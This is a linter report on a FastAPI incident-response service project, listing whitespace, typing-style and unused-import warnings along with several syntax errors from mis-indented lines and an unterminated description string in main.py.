485 |     def get_stats(self) -> Dict:
    |                            ^^^^
486 |         """Get tracing statistics"""
487 |         with self.lock:
    |
help: Replace with `dict`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> kernel\visualize.py:171:9
    |
169 |       def update(self, metric_name: str, value: Any):
170 |           """Update a metric"""
171 | /         if metric_name in self.metrics:
172 | |             if isinstance(self.metrics[metric_name], (int, float)):
    | |___________________________________________________________________^
173 |                   self.metrics[metric_name] = value
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> kernel\visualize.py:177:9
    |
175 |       def increment(self, metric_name: str):
176 |           """Increment a counter metric"""
177 | /         if metric_name in self.metrics:
178 | |             if isinstance(self.metrics[metric_name], int):
    | |__________________________________________________________^
179 |                   self.metrics[metric_name] += 1
    |
help: Combine `if` statements using `and`

F401 [*] `json` imported but unused
 --> octoreflex\bridge_from_emergent.py:7:8
  |
5 | """
6 |
7 | import json
  |        ^^^^
8 | import logging
9 | import subprocess
  |
help: Remove unused import: `json`

F401 [*] `subprocess` imported but unused
  --> octoreflex\bridge_from_emergent.py:9:8
   |
 7 | import json
 8 | import logging
 9 | import subprocess
   |        ^^^^^^^^^^
10 |
11 | logger = logging.getLogger("octoreflex_bridge")
   |
help: Remove unused import: `subprocess`

N999 Invalid module name: 'autonomous-incident-reflex-system'
--> orchestrator\autonomous-incident-reflex-system\__init__.py:1:1

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\config.py:12:1
   |
10 | class Settings(BaseSettings):
11 |     """Application settings with validation"""
12 |     
   | ^^^^
13 |     # Service Metadata
14 |     SERVICE_NAME: str = "Autonomous Incident Reflex System"
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\config.py:17:1
   |
15 |     VERSION: str = "1.0.0"
16 |     ENVIRONMENT: str = Field(default="development", pattern="^(development|staging|production)$")
17 |     
   | ^^^^
18 |     # Server Configuration
19 |     HOST: str = "0.0.0.0"
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\config.py:22:1
   |
20 |     PORT: int = 8000
21 |     API_PREFIX: str = "/api/v1"
22 |     
   | ^^^^
23 |     # Security
24 | API_KEYS: List[str] = Field(default_factory=lambda: os.getenv("API_KEYS", "changeme").split(","))
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> orchestrator\autonomous-incident-reflex-system\config.py:25:1
   |
23 |     # Security
24 | API_KEYS: List[str] = Field(default_factory=lambda: os.getenv("API_KEYS", "changeme").split(","))
25 |     API_KEY_HEADER: str = "X-API-Key"
   | ^^^^
26 | JWT_SECRET: str = Field(default="changeme-secret-key")
27 |     JWT_ALGORITHM: str = "HS256"
   |

invalid-syntax: Expected a statement
  --> orchestrator\autonomous-incident-reflex-system\config.py:26:1
   |
24 | API_KEYS: List[str] = Field(default_factory=lambda: os.getenv("API_KEYS", "changeme").split(","))
25 |     API_KEY_HEADER: str = "X-API-Key"
26 | JWT_SECRET: str = Field(default="changeme-secret-key")
   | ^
27 |     JWT_ALGORITHM: str = "HS256"
28 |     JWT_EXPIRY_HOURS: int = 24
   |

invalid-syntax: Unexpected indentation
  --> orchestrator\autonomous-incident-reflex-system\config.py:27:1
   |
25 |     API_KEY_HEADER: str = "X-API-Key"
26 | JWT_SECRET: str = Field(default="changeme-secret-key")
27 |     JWT_ALGORITHM: str = "HS256"
   | ^^^^
28 |     JWT_EXPIRY_HOURS: int = 24
29 | # Rate Limiting
   |

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\config.py:32:1
   |
30 |     RATE_LIMIT_PER_MINUTE: int = 250
31 |     RATE_LIMIT_BURST: int = 500
32 |     
   | ^^^^
33 |     # CORS
34 |     CORS_ORIGINS: List[str] = ['*']
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\config.py:35:1
   |
33 |     # CORS
34 |     CORS_ORIGINS: List[str] = ['*']
35 |     
   | ^^^^
36 |     # Database
37 | DB_POOL_SIZE: int = 20
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> orchestrator\autonomous-incident-reflex-system\config.py:37:1
   |
36 |     # Database
37 | DB_POOL_SIZE: int = 20
   | ^
38 |     DB_TIMEOUT: int = 30
   |

invalid-syntax: Unexpected indentation
  --> orchestrator\autonomous-incident-reflex-system\config.py:38:1
   |
36 |     # Database
37 | DB_POOL_SIZE: int = 20
38 |     DB_TIMEOUT: int = 30
   | ^^^^
39 |     
40 |     # Observability
   |

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\config.py:39:1
   |
37 | DB_POOL_SIZE: int = 20
38 |     DB_TIMEOUT: int = 30
39 |     
   | ^^^^
40 |     # Observability
41 |     LOG_LEVEL: str = "INFO"
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\config.py:45:1
   |
43 |     ENABLE_TRACING: bool = true
44 |     METRICS_PORT: int = 9090
45 |     
   | ^^^^
46 |     # Feature Flags
47 |     ENABLE_API_DOCS: bool = true
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\config.py:48:1
   |
46 |     # Feature Flags
47 |     ENABLE_API_DOCS: bool = true
48 |     
   | ^^^^
49 |     model_config = SettingsConfigDict(
50 |         env_file=".env",
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\config.py:55:1
   |
53 |         extra="ignore",
54 |     )
55 |     
   | ^^^^
56 |     def is_production(self) -> bool:
57 |         """Check if running in production"""
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\config.py:59:1
   |
57 |         """Check if running in production"""
58 |         return self.ENVIRONMENT == "production"
59 |     
   | ^^^^
60 |     def is_development(self) -> bool:
61 |         """Check if running in development"""
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> orchestrator\autonomous-incident-reflex-system\config.py:66:1
   |
65 | # Global settings instance
66 | settings = Settings()
   | ^
67 |
68 | # Validate critical settings on import
   |

invalid-syntax: Expected an indented block after `if` statement
  --> orchestrator\autonomous-incident-reflex-system\config.py:70:1
   |
68 | # Validate critical settings on import
69 | if settings.is_production():
70 | if "changeme" in settings.API_KEYS:
   | ^^
71 |         raise ValueError("API_KEYS must be changed in production")
72 | if settings.JWT_SECRET == "changeme-secret-key":
   |

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> orchestrator\autonomous-incident-reflex-system\errors.py:5:1
  |
3 | """
4 |
5 | from typing import Any, Dict, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
6 |
7 | from fastapi import FastAPI, Request, status
  |

UP045 [*] Use `X | None` for type annotations
  --> orchestrator\autonomous-incident-reflex-system\errors.py:21:18
   |
19 |         code: str,
20 |         status_code: int = status.HTTP_500_INTERNAL_SERVER_ERROR,
21 |         details: Optional[Dict[str, Any]] = None,
   |                  ^^^^^^^^^^^^^^^^^^^^^^^^
22 |     ):
23 |         self.message = message
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> orchestrator\autonomous-incident-reflex-system\errors.py:21:27
   |
19 |         code: str,
20 |         status_code: int = status.HTTP_500_INTERNAL_SERVER_ERROR,
21 |         details: Optional[Dict[str, Any]] = None,
   |                           ^^^^
22 |     ):
23 |         self.message = message
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> orchestrator\autonomous-incident-reflex-system\errors.py:33:47
   |
31 |     """Validation error"""
32 |
33 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                               ^^^^^^^^^^^^^^^^^^^^^^^^
34 |         super().__init__(
35 |             message=message,
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> orchestrator\autonomous-incident-reflex-system\errors.py:33:56
   |
31 |     """Validation error"""
32 |
33 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                                        ^^^^
34 |         super().__init__(
35 |             message=message,
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> orchestrator\autonomous-incident-reflex-system\errors.py:79:47
   |
77 |     """Conflict error (e.g., duplicate resource)"""
78 |
79 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                               ^^^^^^^^^^^^^^^^^^^^^^^^
80 |         super().__init__(
81 |             message=message,
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> orchestrator\autonomous-incident-reflex-system\errors.py:79:56
   |
77 |     """Conflict error (e.g., duplicate resource)"""
78 |
79 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                                        ^^^^
80 |         super().__init__(
81 |             message=message,
   |
help: Replace with `dict`

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\health.py:41:1
   |
39 |     checks = {}
40 |     all_ready = True
41 |     
   | ^^^^
42 |     # Check database connection
43 |     try:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\health.py:52:1
   |
50 |         checks["database"] = "error"
51 |         all_ready = False
52 |     
   | ^^^^
53 |     response_status = "ready" if all_ready else "not_ready"
54 |     status_code = status.HTTP_200_OK if all_ready else status.HTTP_503_SERVICE_UNAVAILABLE
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\health.py:55:1
   |
53 |     response_status = "ready" if all_ready else "not_ready"
54 |     status_code = status.HTTP_200_OK if all_ready else status.HTTP_503_SERVICE_UNAVAILABLE
55 |     
   | ^^^^
56 |     return HealthResponse(
57 |         status=response_status,
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\health.py:82:1
   |
80 |     checks = {}
81 |     startup_complete = True
82 |     
   | ^^^^
83 |     # Check database connection
84 |     try:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\health.py:93:1
   |
91 |         checks["database"] = "error"
92 |         startup_complete = False
93 |     
   | ^^^^
94 | # Check migrations
95 |     try:
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
   --> orchestrator\autonomous-incident-reflex-system\health.py:106:1
    |
104 |         startup_complete = False
105 | response_status = "started" if startup_complete else "starting"
106 |     status_code = status.HTTP_200_OK if startup_complete else status.HTTP_503_SERVICE_UNAVAILABLE
    | ^^^^
107 |     
108 |     return HealthResponse(
    |

W293 Blank line contains whitespace
   --> orchestrator\autonomous-incident-reflex-system\health.py:107:1
    |
105 | response_status = "started" if startup_complete else "starting"
106 |     status_code = status.HTTP_200_OK if startup_complete else status.HTTP_503_SERVICE_UNAVAILABLE
107 |     
    | ^^^^
108 |     return HealthResponse(
109 |         status=response_status,
    |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
   --> orchestrator\autonomous-incident-reflex-system\health.py:115:1
    |
113 |         checks=checks,
114 |     )
    |      ^
    |

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\logging_config.py:17:1
   |
15 | class JSONFormatter(logging.Formatter):
16 |     """JSON log formatter for structured logging"""
17 |     
   | ^^^^
18 |     def format(self, record: logging.LogRecord) -> str:
19 |         log_data: Dict[str, Any] = {
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\logging_config.py:27:1
   |
25 |             "version": "1.0.0",
26 |         }
27 |         
   | ^^^^^^^^
28 |         # Add request ID if available
29 |         request_id = request_id_var.get()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\logging_config.py:32:1
   |
30 |         if request_id:
31 |             log_data["request_id"] = request_id
32 |         
   | ^^^^^^^^
33 |         # Add exception info if present
34 |         if record.exc_info:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\logging_config.py:36:1
   |
34 |         if record.exc_info:
35 |             log_data["exception"] = self.formatException(record.exc_info)
36 |         
   | ^^^^^^^^
37 |         # Add extra fields
38 |         if hasattr(record, "extra"):
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\logging_config.py:40:1
   |
38 |         if hasattr(record, "extra"):
39 |             log_data.update(record.extra)
40 |         
   | ^^^^^^^^
41 |         return json.dumps(log_data)
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> orchestrator\autonomous-incident-reflex-system\logging_config.py:49:1
   |
47 | handler.setFormatter(JSONFormatter())
48 | # Configure root logger
49 |     logging.root.handlers = [handler]
   | ^^^^
50 |     logging.root.setLevel("INFO")
   |

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\logging_config.py:51:1
   |
49 |     logging.root.handlers = [handler]
50 |     logging.root.setLevel("INFO")
51 |     
   | ^^^^
52 |     # Reduce noise from third-party libraries
53 |     logging.getLogger("uvicorn").setLevel(logging.WARNING)
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> orchestrator\autonomous-incident-reflex-system\logging_config.py:58:1
   |
57 | # Create module logger
58 | logger = logging.getLogger("autonomous_incident_reflex_system")
   | ^
   |

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\main.py:60:1
   |
58 |     # Startup
59 |     logger.info("Starting Autonomous Incident Reflex System service v1.0.0")
60 |     
   | ^^^^
61 |     # Initialize database
62 |     await database.connect()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\main.py:64:1
   |
62 |     await database.connect()
63 |     logger.info("Database connection established")
64 |     
   | ^^^^
65 |     # Run migrations if needed
66 | from .repository import run_migrations
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> orchestrator\autonomous-incident-reflex-system\main.py:67:1
   |
65 |     # Run migrations if needed
66 | from .repository import run_migrations
67 |     await run_migrations()
   | ^^^^
68 |     logger.info("Database migrations completed")
69 | logger.info("Service startup complete")
   |

invalid-syntax: Expected a statement
  --> orchestrator\autonomous-incident-reflex-system\main.py:69:1
   |
67 |     await run_migrations()
68 |     logger.info("Database migrations completed")
69 | logger.info("Service startup complete")
   | ^
70 |     
71 |     yield
   |

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\main.py:70:1
   |
68 |     logger.info("Database migrations completed")
69 | logger.info("Service startup complete")
70 |     
   | ^^^^
71 |     yield
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> orchestrator\autonomous-incident-reflex-system\main.py:71:1
   |
69 | logger.info("Service startup complete")
70 |     
71 |     yield
   | ^^^^
72 |     
73 |     # Shutdown
   |

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\main.py:72:1
   |
71 |     yield
72 |     
   | ^^^^
73 |     # Shutdown
74 |     logger.info("Shutting down Autonomous Incident Reflex System service")
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\main.py:75:1
   |
73 |     # Shutdown
74 |     logger.info("Shutting down Autonomous Incident Reflex System service")
75 |     
   | ^^^^
76 |     # Close database connections
77 |     await database.disconnect()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\main.py:79:1
   |
77 |     await database.disconnect()
78 |     logger.info("Database connections closed")
79 |     
   | ^^^^
80 |     logger.info("Service shutdown complete")
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> orchestrator\autonomous-incident-reflex-system\main.py:84:1
   |
83 | # Create FastAPI application
84 | app = FastAPI(
   | ^
85 |     title="Autonomous Incident Reflex System",
86 |     description="Build:
   |

invalid-syntax: missing closing quote in string literal
  --> orchestrator\autonomous-incident-reflex-system\main.py:86:17
   |
84 | app = FastAPI(
85 |     title="Autonomous Incident Reflex System",
86 |     description="Build:
   |                 ^^^^^^^
87 | Threat detection microservice
88 | Policy evaluation gate
   |

invalid-syntax: Expected `,`, found name
  --> orchestrator\autonomous-incident-reflex-system\main.py:87:1
   |
85 |     title="Autonomous Incident Reflex System",
86 |     description="Build:
87 | Threat detection microservice
   | ^^^^^^
88 | Policy evaluation gate
89 | Reflexive action executor
   |

invalid-syntax: Expected `,`, found name
  --> orchestrator\autonomous-incident-reflex-system\main.py:87:8
   |
85 |     title="Autonomous Incident Reflex System",
86 |     description="Build:
87 | Threat detection microservice
   |        ^^^^^^^^^
88 | Policy evaluation gate
89 | Reflexive action executor
   |

invalid-syntax: Expected `,`, found name
  --> orchestrator\autonomous-incident-reflex-system\main.py:87:18
   |
85 |     title="Autonomous Incident Reflex System",
86 |     description="Build:
87 | Threat detection microservice
   |                  ^^^^^^^^^^^^
88 | Policy evaluation gate
89 | Reflexive action executor
   |

invalid-syntax: Expected `,`, found name
  --> orchestrator\autonomous-incident-reflex-system\main.py:88:1
   |
86 |     description="Build:
87 | Threat detection microservice
88 | Policy evaluation gate
   | ^^^^^^
89 | Reflexive action executor
90 | Evidence preservation pipeline
   |

invalid-syntax: Expected `,`, found name
  --> orchestrator\autonomous-incident-reflex-system\main.py:88:8
   |
86 |     description="Build:
87 | Threat detection microservice
88 | Policy evaluation gate
   |        ^^^^^^^^^^
89 | Reflexive action executor
90 | Evidence preservation pipeline
   |

invalid-syntax: Expected `,`, found name
  --> orchestrator\autonomous-incident-reflex-system\main.py:88:19
   |
86 |     description="Build:
87 | Threat detection microservice
88 | Policy evaluation gate
   |                   ^^^^
89 | Reflexive action executor
90 | Evidence preservation pipeline
   |

invalid-syntax: Expected `,`, found name
  --> orchestrator\autonomous-incident-reflex-system\main.py:89:1
   |
87 | Threat detection microservice
88 | Policy evaluation gate
89 | Reflexive action executor
   | ^^^^^^^^^
90 | Evidence preservation pipeline
91 | Cryptographic chain-of-custody service
   |

invalid-syntax: Expected `,`, found name
  --> orchestrator\autonomous-incident-reflex-system\main.py:89:11
   |
87 | Threat detection microservice
88 | Policy evaluation gate
89 | Reflexive action executor
   |           ^^^^^^
90 | Evidence preservation pipeline
91 | Cryptographic chain-of-custody service
   |

invalid-syntax: Expected `,`, found name
  --> orchestrator\autonomous-incident-reflex-system\main.py:89:18
   |
87 | Threat detection microservice
88 | Policy evaluation gate
89 | Reflexive action executor
   |                  ^^^^^^^^
90 | Evidence preservation pipeline
91 | Cryptographic chain-of-custody service
   |

invalid-syntax: Expected `,`, found name
  --> orchestrator\autonomous-incident-reflex-system\main.py:90:1
   |
88 | Policy evaluation gate
89 | Reflexive action executor
90 | Evidence preservation pipeline
   | ^^^^^^^^
91 | Cryptographic chain-of-custody service
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
   |

invalid-syntax: Expected `,`, found name
  --> orchestrator\autonomous-incident-reflex-system\main.py:90:10
   |
88 | Policy evaluation gate
89 | Reflexive action executor
90 | Evidence preservation pipeline
   |          ^^^^^^^^^^^^
91 | Cryptographic chain-of-custody service
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
   |

invalid-syntax: Expected `,`, found name
  --> orchestrator\autonomous-incident-reflex-system\main.py:90:23
   |
88 | Policy evaluation gate
89 | Reflexive action executor
90 | Evidence preservation pipeline
   |                       ^^^^^^^^
91 | Cryptographic chain-of-custody service
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
   |

invalid-syntax: Expected `,`, found name
  --> orchestrator\autonomous-incident-reflex-system\main.py:91:1
   |
89 | Reflexive action executor
90 | Evidence preservation pipeline
91 | Cryptographic chain-of-custody service
   | ^^^^^^^^^^^^^
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
93 | Defense sector eats this up.",
   |

invalid-syntax: Expected `,`, found name
  --> orchestrator\autonomous-incident-reflex-system\main.py:91:15
   |
89 | Reflexive action executor
90 | Evidence preservation pipeline
91 | Cryptographic chain-of-custody service
   |               ^^^^^
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
93 | Defense sector eats this up.",
   |

invalid-syntax: Expected `,`, found name
  --> orchestrator\autonomous-incident-reflex-system\main.py:91:32
   |
89 | Reflexive action executor
90 | Evidence preservation pipeline
91 | Cryptographic chain-of-custody service
   |                                ^^^^^^^
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
93 | Defense sector eats this up.",
   |

invalid-syntax: Expected `,`, found name
  --> orchestrator\autonomous-incident-reflex-system\main.py:92:1
   |
90 | Evidence preservation pipeline
91 | Cryptographic chain-of-custody service
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
   | ^^^^^
93 | Defense sector eats this up.",
94 |     version="1.0.0",
   |

invalid-syntax: Expected `,`, found `:`
  --> orchestrator\autonomous-incident-reflex-system\main.py:92:6
   |
90 | Evidence preservation pipeline
91 | Cryptographic chain-of-custody service
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
   |      ^
93 | Defense sector eats this up.",
94 |     version="1.0.0",
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> orchestrator\autonomous-incident-reflex-system\main.py:92:8
   |
90 | Evidence preservation pipeline
91 | Cryptographic chain-of-custody service
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
   |        ^^^^^^^^^^^^^^^^^^^^^^^
93 | Defense sector eats this up.",
94 |     version="1.0.0",
   |

invalid-syntax: Expected `,`, found name
  --> orchestrator\autonomous-incident-reflex-system\main.py:92:32
   |
90 | Evidence preservation pipeline
91 | Cryptographic chain-of-custody service
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
   |                                ^^^^^^^^
93 | Defense sector eats this up.",
94 |     version="1.0.0",
   |

invalid-syntax: Expected `,`, found name
  --> orchestrator\autonomous-incident-reflex-system\main.py:92:57
   |
90 | Evidence preservation pipeline
91 | Cryptographic chain-of-custody service
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
   |                                                         ^^^^^^
93 | Defense sector eats this up.",
94 |     version="1.0.0",
   |

invalid-syntax: Expected `,`, found name
  --> orchestrator\autonomous-incident-reflex-system\main.py:93:9
   |
91 | Cryptographic chain-of-custody service
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
93 | Defense sector eats this up.",
   |         ^^^^^^
94 |     version="1.0.0",
95 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> orchestrator\autonomous-incident-reflex-system\main.py:93:16
   |
91 | Cryptographic chain-of-custody service
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
93 | Defense sector eats this up.",
   |                ^^^^
94 |     version="1.0.0",
95 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> orchestrator\autonomous-incident-reflex-system\main.py:93:21
   |
91 | Cryptographic chain-of-custody service
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
93 | Defense sector eats this up.",
   |                     ^^^^
94 |     version="1.0.0",
95 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> orchestrator\autonomous-incident-reflex-system\main.py:93:26
   |
91 | Cryptographic chain-of-custody service
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
93 | Defense sector eats this up.",
   |                          ^^
94 |     version="1.0.0",
95 |     lifespan=lifespan,
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> orchestrator\autonomous-incident-reflex-system\main.py:93:26
   |
91 | Cryptographic chain-of-custody service
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
93 | Defense sector eats this up.",
   |                          ^^^
94 |     version="1.0.0",
95 |     lifespan=lifespan,
   |

invalid-syntax: missing closing quote in string literal
  --> orchestrator\autonomous-incident-reflex-system\main.py:93:29
   |
91 | Cryptographic chain-of-custody service
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
93 | Defense sector eats this up.",
   |                             ^^
94 |     version="1.0.0",
95 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found string
  --> orchestrator\autonomous-incident-reflex-system\main.py:93:29
   |
91 | Cryptographic chain-of-custody service
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
93 | Defense sector eats this up.",
   |                             ^^
94 |     version="1.0.0",
95 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> orchestrator\autonomous-incident-reflex-system\main.py:94:5
   |
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
93 | Defense sector eats this up.",
94 |     version="1.0.0",
   |     ^^^^^^^
95 |     lifespan=lifespan,
96 | docs_url="/api/v1/docs",
   |

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\middleware.py:18:1
   |
16 | class RequestIDMiddleware(BaseHTTPMiddleware):
17 |     """Add unique request ID to each request"""
18 |     
   | ^^^^
19 |     async def dispatch(self, request: Request, call_next: Callable):
20 |         # Generate or extract request ID
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\middleware.py:22:1
   |
20 |         # Generate or extract request ID
21 |         request_id = request.headers.get("X-Request-ID", str(uuid.uuid4()))
22 |         
   | ^^^^^^^^
23 |         # Set in context for logging
24 |         request_id_var.set(request_id)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\middleware.py:25:1
   |
23 |         # Set in context for logging
24 |         request_id_var.set(request_id)
25 |         
   | ^^^^^^^^
26 |         # Add to request state
27 |         request.state.request_id = request_id
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\middleware.py:28:1
   |
26 |         # Add to request state
27 |         request.state.request_id = request_id
28 |         
   | ^^^^^^^^
29 |         # Call next middleware
30 |         response = await call_next(request)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\middleware.py:31:1
   |
29 |         # Call next middleware
30 |         response = await call_next(request)
31 |         
   | ^^^^^^^^
32 |         # Add to response headers
33 |         response.headers["X-Request-ID"] = request_id
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\middleware.py:34:1
   |
32 |         # Add to response headers
33 |         response.headers["X-Request-ID"] = request_id
34 |         
   | ^^^^^^^^
35 |         return response
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\middleware.py:40:1
   |
38 | class MetricsMiddleware(BaseHTTPMiddleware):
39 |     """Collect Prometheus metrics for requests"""
40 |     
   | ^^^^
41 |     async def dispatch(self, request: Request, call_next: Callable):
42 |         # Skip metrics endpoint itself
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\middleware.py:45:1
   |
43 |         if request.url.path == "/metrics":
44 |             return await call_next(request)
45 |         
   | ^^^^^^^^
46 |         # Increment inflight requests
47 |         INFLIGHT_REQUESTS.inc()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\middleware.py:48:1
   |
46 |         # Increment inflight requests
47 |         INFLIGHT_REQUESTS.inc()
48 |         
   | ^^^^^^^^
49 |         # Record start time
50 |         start_time = time.time()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\middleware.py:51:1
   |
49 |         # Record start time
50 |         start_time = time.time()
51 |         
   | ^^^^^^^^
52 |         try:
53 |             # Process request
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\middleware.py:55:1
   |
53 |             # Process request
54 |             response = await call_next(request)
55 |             
   | ^^^^^^^^^^^^
56 |             # Record metrics
57 |             duration = time.time() - start_time
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\middleware.py:59:1
   |
57 |             duration = time.time() - start_time
58 |             status_class = f"{response.status_code // 100}xx"
59 |             
   | ^^^^^^^^^^^^
60 |             # Get route template (not raw path to avoid high cardinality)
61 |             route_template = self._get_route_template(request)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\middleware.py:62:1
   |
60 |             # Get route template (not raw path to avoid high cardinality)
61 |             route_template = self._get_route_template(request)
62 |             
   | ^^^^^^^^^^^^
63 |             REQUEST_COUNT.labels(
64 |                 method=request.method,
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\middleware.py:68:1
   |
66 |                 status_class=status_class,
67 |             ).inc()
68 |             
   | ^^^^^^^^^^^^
69 |             REQUEST_DURATION.labels(
70 |                 method=request.method,
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\middleware.py:73:1
   |
71 |                 route_template=route_template,
72 |             ).observe(duration)
73 |             
   | ^^^^^^^^^^^^
74 |             return response
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\middleware.py:75:1
   |
74 |             return response
75 |         
   | ^^^^^^^^
76 |         finally:
77 |             # Decrement inflight requests
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\middleware.py:79:1
   |
77 |             # Decrement inflight requests
78 |             INFLIGHT_REQUESTS.dec()
79 |     
   | ^^^^
80 |     @staticmethod
81 |     def _get_route_template(request: Request) -> str:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\middleware.py:90:1
   |
88 | class RateLimitMiddleware(BaseHTTPMiddleware):
89 |     """Token bucket rate limiter"""
90 |     
   | ^^^^
91 |     def __init__(self, app, requests_per_minute: int = 100, burst: int = 200):
